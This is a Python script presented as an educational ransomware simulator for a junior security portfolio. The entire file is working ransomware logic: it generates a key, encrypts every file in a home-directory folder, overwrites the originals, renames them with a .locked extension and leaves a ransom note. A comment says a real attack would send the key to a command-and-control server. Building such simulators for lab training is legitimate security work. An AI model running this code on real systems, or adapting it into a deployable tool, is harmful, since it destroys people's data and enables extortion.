import os
from cryptography.fernet import Fernet

# ==========================================
# RANSOMWARE SIMULATOR - EDUCATIONAL PoC
# Custom built for Renatoissance's Security Lab
# ==========================================

# 1. Configuration
# Keeping your original folder name so the script works immediately!
TARGET_DIR = os.path.expanduser("~/WICHTIGE_FIRMEN_DATEN")
EXTENSION = ".locked"

# 2. Generate the encryption key
# (In a real attack this key would be exfiltrated to the attacker's C2 server)
key = Fernet.generate_key()
cipher = Fernet(key)

# We save the key locally so we can (theoretically) decrypt our files later.
# Don't lose this, or your dummy files are gone forever! :(((
with open("secret.key", "wb") as key_file:
    key_file.write(key)

print(f"[*] Renatoissance's Attack initiated on: {TARGET_DIR}")

# 3. Iterate through the target directory
for filename in os.listdir(TARGET_DIR):
    filepath = os.path.join(TARGET_DIR, filename)
    
    # Only encrypt files (skip directories) and ignore already encrypted files
    if os.path.isfile(filepath) and not filename.endswith(EXTENSION):
        try:
            # Read original file data
            with open(filepath, "rb") as f:
                data = f.read()
            
            # Encrypt the data using AES (Fernet)
            encrypted_data = cipher.encrypt(data)
            
            # Write the encrypted data back to the file
            with open(filepath, "wb") as f:
                f.write(encrypted_data)
            
            # Rename the file (e.g., document.txt -> document.txt.locked)
            os.rename(filepath, filepath + EXTENSION)
            print(f"[+] Encrypted successfully: {filename}")
            
        except Exception as e:
            print(f"[!] Error encrypting {filename}: {e}")

# 4. The Ransom Note
# Leaving a custom signature from Renatoissance
note_path = os.path.join(TARGET_DIR, "READ_ME_NOW.txt")
with open(note_path, "w") as note:
    note.write("OOPS! Your files have been encrypted by the Renatoissance Simulator.\n")
    note.write("This is a Proof of Concept for a Junior IT-Security Portfolio.\n")
    note.write("Send 0.5 Bitcoin to ... just kidding. Keep your money! ;)\n")

print("\n[!] ATTACK COMPLETED. All files are now completely unreadable.")
